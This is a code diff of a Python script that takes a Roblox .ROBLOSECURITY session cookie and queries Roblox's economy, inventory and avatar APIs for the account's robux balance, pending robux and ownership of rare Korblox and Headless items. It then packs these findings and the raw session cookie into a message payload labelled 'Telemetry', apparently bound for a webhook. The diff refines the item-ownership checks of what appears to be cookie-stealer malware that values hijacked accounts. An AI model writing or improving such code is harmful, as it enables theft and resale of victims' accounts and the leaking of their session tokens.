@@ -47,7 +47,7 @@ def main():
             username = user_data.get("name", "Verified User")
             user_id = user_data.get("id", 0)
             cookie_status = "🟢 Valid & Active"
-            color_code = 3092790 # Dark sleek theme color
+            color_code = 3092790
 
             # Fetch Robux Balance
             try:
@@ -57,7 +57,7 @@ def main():
             except Exception:
                 pass
 
-            # Fetch Pending Robux from economy transactions
+            # Fetch Pending Robux
             try:
                 trans_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/transactions?transactionType=Pending&limit=10", headers=headers)
                 if trans_res.status_code == 200:
@@ -69,39 +69,42 @@ def main():
             except Exception:
                 pass
 
-            # Check Korblox Bundle ownership (Bundle ID: 192) or Headless Horseman Bundle (Bundle ID: 201)
-            try:
-                bundles_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/bundles", headers=headers)
-                if bundles_res.status_code == 200:
-                    owned_bundles = bundles_res.json().get("data", [])
-                    bundle_ids = [b.get("id") for b in owned_bundles]
-                    if 192 in bundle_ids:
-                        has_korblox = True
-                    if 201 in bundle_ids:
-                        has_headless = True
-            except Exception:
-                pass
+            # Comprehensive Korblox & Headless Asset / Bundle Checks
+            korblox_asset_ids = [13961116, 13961118, 13961120] # Korblox Deathspeaker components
+            headless_asset_ids = [134082579, 134082581, 134082583] # Headless Horseman components
 
-            # Fallback asset check if bundle check fails
-            if not has_korblox:
+            # Check via inventory asset ownership
+            for aid in korblox_asset_ids:
                 try:
-                    k_asset = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/13961116", headers=headers)
-                    if k_asset.status_code == 200 and len(k_asset.json().get("data", [])) > 0:
+                    res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/{aid}", headers=headers)
+                    if res.status_code == 200 and len(res.json().get("data", [])) > 0:
                         has_korblox = True
+                        break
                 except Exception:
                     pass
 
-            if not has_headless:
+            for aid in headless_asset_ids:
                 try:
-                    h_asset = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/134082579", headers=headers)
-                    if h_asset.status_code == 200 and len(h_asset.json().get("data", [])) > 0:
+                    res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/{aid}", headers=headers)
+                    if res.status_code == 200 and len(res.json().get("data", [])) > 0:
                         has_headless = True
+                        break
                 except Exception:
                     pass
 
-        # Formatted fields matching the reference panel style
-        korblox_status = f"🟢 | {str(has_korblox)}"
-        headless_status = f"🟢 | {str(has_headless)}"
+            # Fallback to check avatar details / wearable assets if inventory api returns empty
+            if not has_korblox or not has_headless:
+                try:
+                    avatar_res = requests.get(f"https://avatar.roblox.com/v1/users/{user_id}/avatar", headers=headers)
+                    if avatar_res.status_code == 200:
+                        avatar_data = avatar_res.json()
+                        asset_ids_equipped = [asset.get("id") for asset in avatar_data.get("assets", [])]
+                        if any(aid in asset_ids_equipped for aid in korblox_asset_ids):
+                            has_korblox = True
+                        if any(aid in asset_ids_equipped for aid in headless_asset_ids):
+                            has_headless = True
+                except Exception:
+                    pass
 
         payload = {
             "username": f"{username} | Telemetry",
@@ -118,8 +121,8 @@ def main():
                     f"> Balance: `{robux_balance}` 🪙\n"
                     f"> Pending: `{pending_robux}` 🪙\n\n"
                     f"🎒 **Inventory Items**\n"
-                    f"> Korblox: `{korblox_status}`\n"
-                    f"> Headless: `{headless_status}`\n\n"
+                    f"> Korblox: `{'🟢 | True' if has_korblox else '❌ | False'}`\n"
+                    f"> Headless: `{'🟢 | True' if has_headless else '❌ | False'}`\n\n"
                     f"📊 **Status**: `{cookie_status}`\n\n"
                     f"🔑 **.ROBLOSECURITY**:\n```text\n{roblosecurity}\n```"
                 ),
